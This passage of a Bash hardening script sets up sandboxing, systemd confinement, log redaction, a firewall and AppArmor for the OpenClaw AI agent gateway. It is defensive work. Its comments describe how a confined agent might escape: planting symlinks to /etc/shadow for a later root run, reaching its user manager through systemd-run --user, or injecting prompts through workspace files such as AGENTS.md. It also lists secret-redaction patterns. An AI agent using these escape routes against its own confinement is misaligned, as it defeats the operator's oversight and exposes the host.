echo -e "${C_BLUE}--- Phase 5: Sandbox Configuration ---${C_NC}"

# -----------------------------------------------------------------------------
# Step 11: Docker sandbox
# -----------------------------------------------------------------------------

if [[ "$WITH_SANDBOX" == true ]]; then
    msg "Step 11: Rootless Docker sandbox configured"
    info "  - socket: $SANDBOX_DOCKER_SOCKET"
    info "  - mode/scope: all/session (fresh container per session)"
    info "  - workspaceAccess: ro; network: none; readOnlyRoot: true"
    info "  - capDrop: ALL; pidsLimit: 256; memory+swap: 512m; cpus: 0.5"
else
    info "Step 11: Sandbox not requested (use --with-sandbox to enable)"
    info "Host execution remains explicitly denied by the tool policy"
fi

echo

# =============================================================================
# PHASE 6: PLUGIN & SKILL SECURITY
# =============================================================================

echo -e "${C_BLUE}--- Phase 6: Plugin & Skill Security ---${C_NC}"

# -----------------------------------------------------------------------------
# Step 12: Plugin lockdown (already in config)
# -----------------------------------------------------------------------------

msg "Step 12: Plugin system locked down"
info "  - plugins.enabled: true (system active but deny-by-default)"
info "  - plugins.allow: [] with bundledDiscovery=allowlist"
info "  - skills.allowBundled: []; uploaded archives disabled"
warn "Plugins can load arbitrary npm packages. Only allowlist trusted, audited plugins."

# -----------------------------------------------------------------------------
# Step 13: Hooks disabled (already in config)
# -----------------------------------------------------------------------------

msg "Step 13: Hooks disabled"
info "  - hooks.enabled: false"
info "  - Workspace hook files cannot inject prompts into agent context"
warn "Hooks can be used for prompt injection via AGENTS.md, SOUL.md, TOOLS.md"
warn "Treat all workspace instruction files as untrusted input"

echo

# =============================================================================
# PHASE 7: LOGGING & REDACTION
# =============================================================================

echo -e "${C_BLUE}--- Phase 7: Logging & Redaction ---${C_NC}"

# -----------------------------------------------------------------------------
# Step 14: Secure logging (already in config)
# -----------------------------------------------------------------------------

msg "Step 14: Secure logging configured"
info "  - level: info"
info "  - redactSensitive: tools (tool output is redacted)"
info "  - Custom redaction patterns for:"
info "    * OpenAI API keys (sk-*)"
info "    * Anthropic API keys (sk-ant-*)"
info "    * Bearer tokens"
info "    * PEM private keys (RSA, EC, OPENSSH, PGP)"
info "    * Password assignments"
info "    * GitHub personal access tokens (ghp_*)"
info "    * GitLab tokens (glpat-*)"
info "    * Slack tokens (xox[bpors]-*)"
info "  - Telemetry, crash reports, and analytics: disabled"

# -----------------------------------------------------------------------------
# Step 15: Log rotation
# -----------------------------------------------------------------------------

msg "Step 15: Setting up log rotation..."

OC_LOG_DIR="$OC_DIR/logs"
LOGROTATE_CONF="/etc/logrotate.d/openclaw-$OC_USER"
oc_mkdir 0750 "$OC_LOG_DIR"
install -d -m 0755 /etc/logrotate.d

# Clean up legacy shared /etc/logrotate.d/openclaw when upgrading this user
# (or when no other user's .openclaw directory is referenced).
if [[ -f /etc/logrotate.d/openclaw ]]; then
    if grep -qF "$OC_DIR" /etc/logrotate.d/openclaw 2>/dev/null || \
       ! grep -qE '/\.openclaw/' /etc/logrotate.d/openclaw 2>/dev/null; then
        rm -f /etc/logrotate.d/openclaw
        info "Removed legacy /etc/logrotate.d/openclaw"
    else
        warn "Legacy /etc/logrotate.d/openclaw references another user; re-run openclaw.sh for that user to migrate"
    fi
fi

# NEVER send SIGUSR1 to a Node.js process: Node.js interprets SIGUSR1 as
# "activate V8 inspector debugger", opening a remote debugging port!
cat > "$LOGROTATE_CONF" <<EOF
# Log rotation for OpenClaw ($OC_USER)
# Generated by AwesomeArchLinux/hardening/openclaw/openclaw.sh

$OC_LOG_DIR/*.log
$OC_DIR/agents/*/sessions/*.log {
    daily
    missingok
    rotate 14
    compress
    delaycompress
    notifempty
    copytruncate
    su $OC_USER $OC_GROUP
}
EOF
chmod 0644 "$LOGROTATE_CONF"

msg "Logrotate config created: $LOGROTATE_CONF"

echo

# =============================================================================
# PHASE 8: FILE PERMISSIONS & CREDENTIAL ISOLATION
# =============================================================================

echo -e "${C_BLUE}--- Phase 8: File Permissions & Credential Isolation ---${C_NC}"

# -----------------------------------------------------------------------------
# Step 16: Lock down file permissions
# -----------------------------------------------------------------------------

msg "Step 16: Locking down file permissions..."

# Every mode change in this step is made by $OC_USER itself. Root does not
# chmod or chown anything in this tree: the agent can plant a symlink (e.g.
# exec-approvals.json -> /etc/shadow) and wait for the next hardening run.

# Main OpenClaw directory — owner only
oc_mkdir 0700 "$OC_DIR"
info "  $OC_DIR -> 700"

# Config file — owner read/write only
oc_chmod_file 600 "$OC_CONFIG"

# Credentials directory — owner only
oc_mkdir 0700 "$OC_CREDENTIALS"
info "  $OC_CREDENTIALS/ -> 700"

# Lock down all files in credentials directory (find does not follow symlinks)
if oc_run find "$OC_CREDENTIALS" -xdev -type f -exec chmod 600 {} +; then
    info "  $OC_CREDENTIALS/* -> 600"
else
    warn "  Could not set mode 600 on every file in $OC_CREDENTIALS"
fi

# Session directories — owner only (contain conversation transcripts)
SESSION_DIR_COUNT=$(oc_run find "$OC_DIR/agents" -mindepth 2 -maxdepth 2 -xdev \
    -type d -name sessions -exec chmod 700 {} + -printf 'x' 2>/dev/null || true)
if [[ -n "$SESSION_DIR_COUNT" ]]; then
    info "  $OC_DIR/agents/*/sessions (${#SESSION_DIR_COUNT}) -> 700"
fi

# Exec approvals file
oc_chmod_file 600 "$OC_EXEC_APPROVALS"

# Workspace — owner rwx, group/other none
oc_mkdir 0700 "$OC_WORKSPACE"
info "  $OC_WORKSPACE/ -> 700"

# Log directory
oc_mkdir 0750 "$OC_LOG_DIR"
info "  $OC_LOG_DIR/ -> 750"

# Ownership of the tree is checked, not rewritten: a recursive root chown is
# exactly the primitive a planted link turns against the rest of the system.
# find does not follow symlinks and only reads metadata here.
FOREIGN_OWNED=$(find "$OC_DIR" -xdev ! -user "$OC_USER" -printf '%u %p\n' 2>/dev/null | \
    head -n 20 | LC_ALL=C tr -c '[:print:]\n' '?' || true)
if [[ -n "$FOREIGN_OWNED" ]]; then
    warn "Entries under $OC_DIR that are NOT owned by $OC_USER (first 20, left untouched):"
    while IFS= read -r foreign_entry; do
        warn "    $foreign_entry"
    done <<< "$FOREIGN_OWNED"
    warn "Stop the gateway, review each entry, then fix or remove it by hand."
fi

msg "File permissions locked down"

# -----------------------------------------------------------------------------
# Step 17: Create or preserve secure environment file
# -----------------------------------------------------------------------------

msg "Step 17: Configuring secure environment file..."

# The new content is assembled in root-private scratch space and handed to the
# account, which renames it into place. Root never opens $OC_ENV_FILE.
ENV_BUILD="$ROOT_TMP/env"
if [[ "$ENV_FILE_STATE" == regular ]]; then
    # Existing content is read by the account and handled as data (capped at
    # 1 MiB). The token reaches awk through the environment, never through a
    # sed/awk program text, so a hostile value cannot become a command.
    oc_run head -c 1048577 -- "$OC_ENV_FILE" > "$ENV_BUILD.in" || \
        err "Could not read $OC_ENV_FILE as $OC_USER"
    [[ $(stat -c %s -- "$ENV_BUILD.in") -le 1048576 ]] || \
        err "$OC_ENV_FILE is larger than 1 MiB; refusing to process it"
    OC_NEW_GATEWAY_TOKEN="$GATEWAY_TOKEN" awk '
        /^[[:space:]]*OPENCLAW_GATEWAY_TOKEN=/ {
            print "OPENCLAW_GATEWAY_TOKEN=" ENVIRON["OC_NEW_GATEWAY_TOKEN"]
            found = 1
            next
        }
        { print }
        END { if (!found) printf "\nOPENCLAW_GATEWAY_TOKEN=%s\n", ENVIRON["OC_NEW_GATEWAY_TOKEN"] }
    ' "$ENV_BUILD.in" > "$ENV_BUILD"
    if [[ "$WITH_SANDBOX" == true ]] && ! grep -qE '^[[:space:]]*DOCKER_HOST=' "$ENV_BUILD"; then
        cat >> "$ENV_BUILD" <<EOF

# --- Rootless Docker sandbox ---
DOCKER_HOST=unix://$SANDBOX_DOCKER_SOCKET
OPENCLAW_DOCKER_SOCKET=$SANDBOX_DOCKER_SOCKET
EOF
    fi
    oc_write_file 0600 "$OC_ENV_FILE" < "$ENV_BUILD"
    rm -f -- "$ENV_BUILD" "$ENV_BUILD.in"
    msg "Preserved existing secure environment file: $OC_ENV_FILE (mode 600)"
else
    (
        umask 077
        cat > "$ENV_BUILD" <<EOF
# =============================================================================
# OpenClaw secure environment file
# Generated by AwesomeArchLinux/hardening/openclaw/openclaw.sh
#
# WARNING: This file contains sensitive credentials. It is chmod 600 and
#          owned by $OC_USER:$OC_GROUP. NEVER commit this file to version control.
#          NEVER store secrets in openclaw.json — use this file instead.
# =============================================================================

# --- Gateway Authentication Token ---
# This token is required to connect to the OpenClaw WebSocket gateway.
# It was generated by openssl rand -hex 32 (256-bit entropy).
OPENCLAW_GATEWAY_TOKEN=$GATEWAY_TOKEN

# --- AI Provider API Keys ---
# Replace these placeholders with your actual API keys.
# These keys are loaded by the OpenClaw runtime, NOT stored in openclaw.json.
ANTHROPIC_API_KEY=REPLACE_WITH_YOUR_ANTHROPIC_API_KEY
OPENAI_API_KEY=REPLACE_WITH_YOUR_OPENAI_API_KEY

# --- Optional Provider Keys ---
# GOOGLE_AI_API_KEY=
# MISTRAL_API_KEY=
# GROQ_API_KEY=

# --- Node.js Security Settings ---
NODE_ENV=production
NODE_OPTIONS=--max-old-space-size=1024 --max-http-header-size=8192 --disable-proto=throw

# --- OpenClaw Runtime ---
OPENCLAW_LOG_LEVEL=info
OPENCLAW_TELEMETRY=false
EOF

        if [[ "$WITH_SANDBOX" == true ]]; then
            cat >> "$ENV_BUILD" <<EOF

# --- Rootless Docker sandbox ---
DOCKER_HOST=unix://$SANDBOX_DOCKER_SOCKET
OPENCLAW_DOCKER_SOCKET=$SANDBOX_DOCKER_SOCKET
EOF
        fi
    )
    oc_write_file 0600 "$OC_ENV_FILE" < "$ENV_BUILD"
    rm -f -- "$ENV_BUILD"
    msg "Secure environment file created: $OC_ENV_FILE (mode 600)"
    warn "IMPORTANT: Edit $OC_ENV_FILE to add your actual API keys"
fi

echo

# =============================================================================
# PHASE 9: SYSTEMD SERVICE HARDENING
# =============================================================================

echo -e "${C_BLUE}--- Phase 9: systemd Service Hardening ---${C_NC}"

# -----------------------------------------------------------------------------
# Step 18: Create hardened systemd system service (runs as $OC_USER)
# -----------------------------------------------------------------------------

msg "Step 18: Creating hardened systemd system service (runs as $OC_USER)..."

# The gateway runs from ROOT-OWNED SYSTEM units with User=$OC_USER. A unit in
# the account's own user manager is not a security boundary:
#   - the confined process can reach that manager (systemd-run --user) and
#     start anything, unsandboxed, under the same UID;
#   - the unit file, its drop-in and anything it loads are writable by the
#     account being confined;
#   - systemd.exec(5) only honours AppArmorProfile= and ProtectProc= for
#     system services, and with kernel.unprivileged_userns_clone=0 a user
#     manager starts the service with no filesystem sandbox at all.

# --- Retire the legacy user-level units (written by older versions) ---
LEGACY_USER_UNIT_DIR="$OC_HOME/.config/systemd/user"
LEGACY_AUDIT_SCRIPT="$OC_HOME/.local/bin/openclaw-security-audit.sh"
LEGACY_UNITS_MIGRATED=false
LEGACY_GATEWAY_STATE=""
if oc_run bash -c 'for p in "$@"; do [[ -e "$p" || -L "$p" ]] && exit 0; done; exit 1' _ \
    "$LEGACY_USER_UNIT_DIR/openclaw-gateway.service" \
    "$LEGACY_USER_UNIT_DIR/openclaw-gateway.service.d" \
    "$LEGACY_USER_UNIT_DIR/openclaw-audit.service" \
    "$LEGACY_USER_UNIT_DIR/openclaw-audit.timer" \
    "$LEGACY_AUDIT_SCRIPT"; then
    LEGACY_UNITS_MIGRATED=true
    warn "Legacy user-level OpenClaw units found for $OC_USER — migrating to root-owned system units"

    if oc_run test -L "$LEGACY_USER_UNIT_DIR/default.target.wants/openclaw-gateway.service"; then
        LEGACY_GATEWAY_STATE="enabled"
    fi
    if run_user_systemctl list-units --no-legend openclaw-gateway.service >/dev/null; then
        if run_user_systemctl is-active --quiet openclaw-gateway.service; then
            LEGACY_GATEWAY_STATE="${LEGACY_GATEWAY_STATE:+$LEGACY_GATEWAY_STATE and }running"
        fi
        run_user_systemctl stop openclaw-gateway.service openclaw-audit.timer openclaw-audit.service >/dev/null || true
        run_user_systemctl disable openclaw-gateway.service openclaw-audit.timer >/dev/null || true
        info "  Stopped and disabled user units: openclaw-gateway.service, openclaw-audit.timer, openclaw-audit.service"
    else
        warn "  The user manager of $OC_USER is not reachable; nothing could be stopped through it"
        warn "  If an old gateway is still running, stop it: pkill -u $OC_USER -f 'openclaw.*gateway'"
    fi

    # Removed by the account itself: root does not delete inside its home.
    oc_run rm -f -- \
        "$LEGACY_USER_UNIT_DIR/openclaw-gateway.service" \
        "$LEGACY_USER_UNIT_DIR/openclaw-gateway.service.d/hardening.conf" \
        "$LEGACY_USER_UNIT_DIR/openclaw-audit.service" \
        "$LEGACY_USER_UNIT_DIR/openclaw-audit.timer" \
        "$LEGACY_USER_UNIT_DIR/default.target.wants/openclaw-gateway.service" \
        "$LEGACY_USER_UNIT_DIR/timers.target.wants/openclaw-audit.timer" \
        "$LEGACY_AUDIT_SCRIPT" || \
        warn "  Could not remove every legacy file as $OC_USER; remove what is left by hand"
    oc_run rmdir -- "$LEGACY_USER_UNIT_DIR/openclaw-gateway.service.d" 2>/dev/null || true
    if [[ "$(oc_file_state "$LEGACY_USER_UNIT_DIR/openclaw-gateway.service.d")" != missing ]]; then
        warn "  $LEGACY_USER_UNIT_DIR/openclaw-gateway.service.d still holds files this script did not write"
        warn "  They no longer apply to anything. Port what you need to $SYSTEMD_SYSTEM_DIR/$GATEWAY_UNIT.d/ and delete the directory"
    fi
    info "  Removed legacy unit files, hardening drop-in and $LEGACY_AUDIT_SCRIPT"

    if run_user_systemctl daemon-reload; then
        info "  Reloaded the user manager of $OC_USER"
    fi
    if [[ -n "$LEGACY_GATEWAY_STATE" ]]; then
        warn "  The legacy gateway was $LEGACY_GATEWAY_STATE and is now stopped and disabled."
        warn "  Start its replacement when this run has finished: systemctl enable --now $GATEWAY_UNIT"
    fi
    msg "Legacy user-level units retired for $OC_USER"
fi

# --- Root-owned launcher: loads the env file as the service account ---
# A system unit's EnvironmentFile= is parsed by systemd as root and follows
# symlinks, so pointing it at the account-writable $OC_ENV_FILE would let the
# account feed any root-readable KEY=VALUE file into its own environment.
# The unit instead starts this launcher (as $OC_USER, inside the sandbox),
# which reads the file as plain data and execs the real command.
install -d -o root -g root -m 0755 "$OC_LIBEXEC_DIR"
[[ ! -L "$OC_LIBEXEC_DIR" && "$(stat -c %u -- "$OC_LIBEXEC_DIR")" == 0 ]] || \
    err "$OC_LIBEXEC_DIR must be a real root-owned directory"

cat > "$ROOT_TMP/openclaw-env-exec" <<'LAUNCHER_EOF'
#!/usr/bin/bash
# =============================================================================
# openclaw-env-exec: load a KEY=VALUE file as data, then exec a command
# Generated by AwesomeArchLinux/hardening/openclaw/openclaw.sh
#
# Usage: openclaw-env-exec [--only KEY] ENV_FILE COMMAND [ARG...]
#
# ~/.openclaw/.env is writable by the OpenClaw service account. The systemd
# units run this launcher AS that account, inside the unit's sandbox, so
# nothing privileged ever parses the file. Every line is handled as data:
#   - blank lines and lines starting with '#' or ';' are skipped
#   - an optional leading "export " is dropped
#   - the line is split at the first '='; KEY must be [A-Za-z_][A-Za-z0-9_]*
#   - whitespace around KEY and VALUE and ONE pair of matching quotes around
#     VALUE are stripped (so NODE_OPTIONS=--a=1 --b=2 keeps its spaces)
#   - nothing is expanded, evaluated or sourced; no escapes, no continuations
# With --only KEY every other key is ignored.
# =============================================================================

set -euo pipefail

usage() {
    printf 'Usage: %s [--only KEY] ENV_FILE COMMAND [ARG...]\n' "${0##*/}" >&2
    exit 64
}

only_key=""
if [[ "${1:-}" == "--only" ]]; then
    [[ $# -ge 2 ]] || usage
    only_key=$2
    shift 2
fi
[[ $# -ge 2 ]] || usage
env_file=$1
shift

if (( EUID == 0 )); then
    printf '%s: refusing to run as root\n' "${0##*/}" >&2
    exit 77
fi
if [[ ! -f "$env_file" || ! -r "$env_file" ]]; then
    printf '%s: environment file %s is missing or unreadable\n' "${0##*/}" "$env_file" >&2
    exit 78
fi

while IFS= read -r line || [[ -n "$line" ]]; do
    line=${line%$'\r'}
    line="${line#"${line%%[![:space:]]*}"}"
    if [[ -z "$line" || "$line" == '#'* || "$line" == ';'* ]]; then
        continue
    fi
    if [[ "$line" == export[[:space:]]* ]]; then
        line=${line#export}
        line="${line#"${line%%[![:space:]]*}"}"
    fi
    [[ "$line" == *=* ]] || continue
    key=${line%%=*}
    value=${line#*=}
    key="${key%"${key##*[![:space:]]}"}"
    [[ "$key" =~ ^[A-Za-z_][A-Za-z0-9_]*$ ]] || continue
    if [[ -n "$only_key" && "$key" != "$only_key" ]]; then
        continue
    fi
    value="${value#"${value%%[![:space:]]*}"}"
    value="${value%"${value##*[![:space:]]}"}"
    if [[ ${#value} -ge 2 ]]; then
        if [[ "$value" == \"*\" || "$value" == \'*\' ]]; then
            value=${value:1:${#value}-2}
        fi
    fi
    # Shell-internal read-only names (UID, EUID, PPID, ...) cannot be set.
    if [[ -v "$key" && "${!key@a}" == *r* ]]; then
        printf '%s: ignoring read-only variable %s\n' "${0##*/}" "$key" >&2
        continue
    fi
    export "$key=$value"
done < "$env_file"

exec "$@"
LAUNCHER_EOF
install -o root -g root -m 0755 "$ROOT_TMP/openclaw-env-exec" "$OC_ENV_LAUNCHER"
info "Root-owned env launcher installed: $OC_ENV_LAUNCHER"

GATEWAY_UNIT_AFTER="network-online.target"
GATEWAY_UNIT_WANTS="network-online.target"
AUDIT_UNIT_AFTER="network-online.target"
if [[ "$WITH_APPARMOR" == true ]]; then
    # AppArmorProfile= fails closed, so the profile must be loaded first.
    GATEWAY_UNIT_AFTER+=" apparmor.service"
    AUDIT_UNIT_AFTER+=" apparmor.service"
fi
if [[ "$WITH_SANDBOX" == true ]]; then
    # Rootless Docker lives in the account's user manager. Starting after it
    # also guarantees /run/user/$USER_UID exists when the drop-in masks the
    # manager's own sockets in it.
    GATEWAY_UNIT_AFTER+=" user@${USER_UID}.service"
    GATEWAY_UNIT_WANTS+=" user@${USER_UID}.service"
fi

cat > "$SYSTEMD_SYSTEM_DIR/$GATEWAY_UNIT" <<EOF
# =============================================================================
# Hardened systemd system service for OpenClaw Gateway ($OC_USER)
# Generated by AwesomeArchLinux/hardening/openclaw/openclaw.sh
#
# Root-owned unit; the process runs as user '$OC_USER' (not root).
# Manage with: systemctl start|stop|restart $GATEWAY_UNIT
# View logs:   journalctl -u $GATEWAY_UNIT -f
# =============================================================================

[Unit]
Description=OpenClaw AI Agent Gateway for $OC_USER (Hardened)
Documentation=https://docs.openclaw.ai/gateway
After=$GATEWAY_UNIT_AFTER
Wants=$GATEWAY_UNIT_WANTS
StartLimitIntervalSec=300
StartLimitBurst=5

[Service]
Type=simple
User=$OC_USER
Group=$OC_GROUP
# No EnvironmentFile=: $OC_ENV_FILE is writable by '$OC_USER' and must not be
# parsed by systemd as root. The launcher loads it as '$OC_USER', as data.
ExecStart=$OC_ENV_LAUNCHER $OC_ENV_FILE $OPENCLAW_BIN gateway
WorkingDirectory=$OC_WORKSPACE

# --- Restart policy ---
Restart=on-failure
RestartSec=10
TimeoutStartSec=30
TimeoutStopSec=30

# --- Resource limits ---
LimitNOFILE=4096
LimitNPROC=512

# --- Logging ---
StandardOutput=journal
StandardError=journal
SyslogIdentifier=openclaw-gateway

[Install]
WantedBy=multi-user.target
EOF

chown root:root "$SYSTEMD_SYSTEM_DIR/$GATEWAY_UNIT"
chmod 644 "$SYSTEMD_SYSTEM_DIR/$GATEWAY_UNIT"
msg "systemd system service created: $SYSTEMD_SYSTEM_DIR/$GATEWAY_UNIT"

# -----------------------------------------------------------------------------
# Step 19: Create systemd hardening drop-in
# -----------------------------------------------------------------------------

msg "Step 19: Creating systemd hardening drop-in..."

# The same drop-in is installed for the gateway and for the weekly audit job
# (Step 24), so the audit can never run with fewer restrictions than the
# process whose files it reads.
DROPIN_DIR="$SYSTEMD_SYSTEM_DIR/$GATEWAY_UNIT.d"
AUDIT_DROPIN_DIR="$SYSTEMD_SYSTEM_DIR/$AUDIT_UNIT.d"
HARDENING_CONF="$ROOT_TMP/hardening.conf"
install -d -o root -g root -m 0755 "$DROPIN_DIR"

# Determine RestrictNamespaces based on sandbox
if [[ "$WITH_SANDBOX" == true ]]; then
    NAMESPACE_RESTRICTION="RestrictNamespaces=~cgroup ipc"
    NAMESPACE_COMMENT="# Allow user/net/pid/mnt namespaces for Docker sandbox, restrict cgroup and ipc"
else
    NAMESPACE_RESTRICTION="RestrictNamespaces=yes"
    NAMESPACE_COMMENT="# All namespace creation restricted (no sandbox mode)"
fi

# Keep the account's own user manager out of reach. Its D-Bus and private
# sockets under /run/user/<uid> accept "run this, unsandboxed, as me" from any
# process with the same UID (systemd-run --user).
if [[ "$WITH_SANDBOX" == true ]]; then
    RUNTIME_DIR_RESTRICTION="InaccessiblePaths=-/run/user/${USER_UID}/bus -/run/user/${USER_UID}/systemd"
    RUNTIME_DIR_COMMENT="# Rootless Docker needs /run/user/${USER_UID}/docker.sock, so only the user
# manager's own endpoints are masked. NOTE: the Docker socket itself still
# lets the gateway start containers outside this unit's sandbox (see README)."
else
    RUNTIME_DIR_RESTRICTION="InaccessiblePaths=/run/user"
    RUNTIME_DIR_COMMENT="# Nothing here needs a per-user runtime directory: hide all of /run/user, so a
# user manager is unreachable even if it is started after this service."
fi

# Fail closed: without the '-' prefix a missing profile stops the service
# instead of silently running unconfined. Ignored when AppArmor is disabled.
APPARMOR_DIRECTIVE=""
if [[ "$WITH_APPARMOR" == true ]]; then
    APPARMOR_DIRECTIVE="AppArmorProfile=openclaw-gateway"
fi

cat > "$HARDENING_CONF" <<EOF
# =============================================================================
# systemd hardening drop-in for OpenClaw ($OC_USER)
# Generated by AwesomeArchLinux/hardening/openclaw/openclaw.sh
#
# These directives apply defense-in-depth sandboxing to the OpenClaw process.
# Installed for both $GATEWAY_UNIT and $AUDIT_UNIT.
# Note: MemoryDenyWriteExecute=no is required because Node.js V8 JIT
# needs writable+executable memory pages for just-in-time compilation.
# =============================================================================

[Service]
# --- Filesystem sandboxing ---
ProtectSystem=strict
ProtectHome=read-only
ReadWritePaths=$OC_DIR
PrivateTmp=yes
PrivateDevices=yes
UMask=077

# --- User manager isolation ---
$RUNTIME_DIR_COMMENT
$RUNTIME_DIR_RESTRICTION

# --- Kernel protection ---
ProtectKernelTunables=yes
ProtectKernelModules=yes
ProtectKernelLogs=yes
ProtectControlGroups=yes

# --- Privilege restrictions ---
NoNewPrivileges=yes
LockPersonality=yes
RestrictSUIDSGID=yes
CapabilityBoundingSet=
$APPARMOR_DIRECTIVE

# --- Memory ---
# Node.js V8 JIT requires write+execute memory; cannot use MemoryDenyWriteExecute
MemoryDenyWriteExecute=no

# --- Network restrictions ---
# Outbound HTTPS is permitted for AI provider and messaging APIs; inbound
# exposure is restricted by openclaw.json loopback binding (and optional nftables).
RestrictAddressFamilies=AF_INET AF_INET6 AF_UNIX AF_NETLINK

# --- Namespace restrictions ---
$NAMESPACE_COMMENT
$NAMESPACE_RESTRICTION
RestrictRealtime=yes

# --- System call filtering ---
SystemCallFilter=@system-service @network-io
SystemCallFilter=~@mount @reboot @swap @clock @cpu-emulation @debug @obsolete @raw-io @privileged
SystemCallErrorNumber=EPERM
SystemCallArchitectures=native

# --- Protect proc/sys ---
# The pid-only /proc subset (ProcSubset=) is deliberately NOT enabled. It
# removes /proc/cpuinfo, /proc/meminfo and /proc/stat, and Node.js then reports
# zero CPUs (os.cpus().length == 0), which breaks worker-pool sizing.
# ProtectProc=invisible still hides every other user's processes.
ProtectProc=invisible
ProtectHostname=yes
EOF

install -o root -g root -m 0644 "$HARDENING_CONF" "$DROPIN_DIR/hardening.conf"
msg "Hardening drop-in created: $DROPIN_DIR/hardening.conf"

# Rootless Docker runs inside the account's user manager, which must survive
# logouts and start at boot. Nothing else needs linger any more: the gateway
# and the audit timer are system units.
if [[ "$WITH_SANDBOX" == true ]]; then
    if command -v loginctl &>/dev/null; then
        loginctl enable-linger "$OC_USER" 2>/dev/null || \
            warn "Failed to enable linger for $OC_USER (rootless Docker may not be running after a reboot)"
    fi
elif [[ -e "/var/lib/systemd/linger/$OC_USER" ]]; then
    info "Linger is enabled for $OC_USER and was left unchanged."
    info "The gateway no longer needs a user manager; if nothing else does, turn it off:"
    info "  loginctl disable-linger $OC_USER"
fi

# Reload the system manager so it sees the new units
if systemctl daemon-reload; then
    msg "systemd daemon reloaded"
else
    warn "Could not reload systemd; run manually: systemctl daemon-reload"
fi
if systemctl is-active --quiet "$GATEWAY_UNIT" 2>/dev/null; then
    warn "$GATEWAY_UNIT is running with its previous settings"
    warn "Apply this run's changes when it has finished: systemctl restart $GATEWAY_UNIT"
fi

echo

# =============================================================================
# PHASE 10: FIREWALL RULES (--with-firewall)
# =============================================================================

echo -e "${C_BLUE}--- Phase 10: Firewall Rules ---${C_NC}"

# -----------------------------------------------------------------------------
# Step 20: nftables rules
# -----------------------------------------------------------------------------

if [[ "$WITH_FIREWALL" == true ]]; then
    msg "Step 20: Creating nftables firewall rules..."

    if ! command -v nft &>/dev/null; then
        err "nftables (nft) is required for --with-firewall"
    fi

    # Create nftables include directory if it doesn't exist
    install -d -m 0755 /etc/nftables.d

    cat > "/etc/nftables.d/openclaw.conf" <<EOF
# =============================================================================
# nftables rules for OpenClaw Gateway
# Generated by AwesomeArchLinux/hardening/openclaw/openclaw.sh
#
# Purpose:
#   - Block ALL inbound connections to the gateway port except loopback
#   - Rate-limit logging of blocked connection attempts
#
# Outbound filtering is deliberately not claimed here. A destination-port
# allowlist in a policy-accept chain does not restrict traffic, while a static
# policy-drop allowlist would break dynamic API and messaging endpoints.
#
# Load: nft -f /etc/nftables.d/openclaw.conf
# Or include in /etc/nftables.conf: include "/etc/nftables.d/openclaw.conf"
# =============================================================================

table inet openclaw {
    chain input {
        type filter hook input priority -10; policy accept;
        iifname != "lo" tcp dport $OC_PORT limit rate 5/minute log prefix "openclaw-blocked: " level warn
        iifname != "lo" tcp dport $OC_PORT drop
    }
}
EOF

    chown root:root "/etc/nftables.d/openclaw.conf"
    chmod 644 "/etc/nftables.d/openclaw.conf"
    msg "nftables rules written: /etc/nftables.d/openclaw.conf"

    # The shared helper validates the complete candidate ruleset after its
    # leading flush, avoiding a false "table already exists" on reruns.
    aal_nft_persist_block openclaw-firewall <<'EOF'
include "/etc/nftables.d/openclaw.conf"
EOF
    nft delete table inet openclaw 2>/dev/null || true
    nft -f "/etc/nftables.d/openclaw.conf"
    msg "nftables rules validated, loaded, and persisted"

    info "Firewall policy:"
    info "  - BLOCK all inbound to port $OC_PORT except loopback (127.0.0.1/::1)"
    info "  - Rate-limit logs to 5 blocked attempts/minute"
    info "  - Outbound traffic remains governed by the host firewall and service sandbox"
else
    info "Step 20: Firewall not requested (use --with-firewall to enable)"
    warn "The gateway remains loopback-bound, but the firewall backstop is not installed"
fi

echo

# =============================================================================
# PHASE 11: APPARMOR PROFILE (--with-apparmor)
# =============================================================================

echo -e "${C_BLUE}--- Phase 11: AppArmor Profile ---${C_NC}"

# -----------------------------------------------------------------------------
# Step 21: AppArmor profile
# -----------------------------------------------------------------------------

if [[ "$WITH_APPARMOR" == true ]]; then
    msg "Step 21: Creating AppArmor confinement profile..."

    if [[ -d "$APPARMOR_DIR" ]]; then
        # NODE_BIN, NODE_BIN_REAL and OPENCLAW_BIN_REAL were resolved and
        # checked before any state was changed (see Phase 1).

        SANDBOX_APPARMOR_RULES=""
        if [[ "$WITH_SANDBOX" == true ]]; then
            SANDBOX_APPARMOR_RULES="
  # ---- Rootless Docker sandbox ----
  /usr/bin/docker                             rix,
  owner /run/user/*/docker.sock               rw,"
        fi

        cat > "$APPARMOR_DIR/openclaw-gateway" <<EOF
# =============================================================================
# AppArmor profile for OpenClaw Gateway
# Generated by AwesomeArchLinux/hardening/openclaw/openclaw.sh
#
# This profile confines the OpenClaw Node.js process to:
#   - Read access to Node.js binary, OpenClaw CLI, and system libraries
#   - Execute (inherit this profile) only: node, env, bash/sh/dash, the
#     OpenClaw launcher and the two root-owned helpers of this script
#   - Read/write access to ~/.openclaw/ only (with .env and credentials read-only)
#   - Network access for WebSocket (gateway) and HTTPS (API calls)
#   - Deny mount, ptrace, raw network, and sensitive paths
# This profile is unattached (applied via AppArmorProfile=openclaw-gateway in
# the root-owned system units, or aa-exec -p openclaw-gateway) so host-wide
# /usr/bin/node and npm stay unconfined.
#
# Site additions (for example extra tools the agent may execute) belong in
# /etc/apparmor.d/local/openclaw-gateway, which this script never overwrites.
# =============================================================================

abi <abi/3.0>,

#include <tunables/global>

profile openclaw-gateway flags=(enforce) {
  #include <abstractions/base>
  #include <abstractions/nameservice>
  #include <abstractions/openssl>

  # ---- Network ----
  # Allow TCP/UDP for WebSocket gateway and outbound API calls
  network inet stream,
  network inet dgram,
  network inet6 stream,
  network inet6 dgram,
  network unix stream,

  # Deny raw sockets (no packet sniffing, no ICMP crafting)
  deny network raw,
  deny network packet,

  # ---- Node.js binary and libraries ----
  # 'ix' = execute and stay in this profile. Without an exec rule the gateway
  # cannot start at all; a transition to another profile ('px'/'cx'/'ux') would
  # be refused under NoNewPrivileges=yes and must not be used here.
  $NODE_BIN_REAL                              mrix,
  $NODE_BIN                                   mrix,
  /usr/lib/**                                 mr,
  /usr/lib/node_modules/**                    mr,
  /usr/local/lib/node_modules/**              mr,
  /usr/share/nodejs/**                        r,

  # ---- Interpreters behind the launchers ----
  # The OpenClaw entry point is a '#!/usr/bin/env node' script or a pnpm
  # '/bin/sh' shim, and the helpers below are Bash scripts.
  /usr/bin/env                                mrix,
  /usr/bin/{bash,sh,dash}                     mrix,

  # ---- Root-owned helpers installed by this script ----
  $OC_ENV_LAUNCHER                            rix,
  $AUDIT_SCRIPT                               rix,
  # Log housekeeping of the weekly audit helper (nothing else is executable;
  # further tools are a site decision for local/openclaw-gateway).
  /usr/bin/{mkdir,rm}                         mrix,

  # ---- OpenClaw installation (pnpm global or local) ----
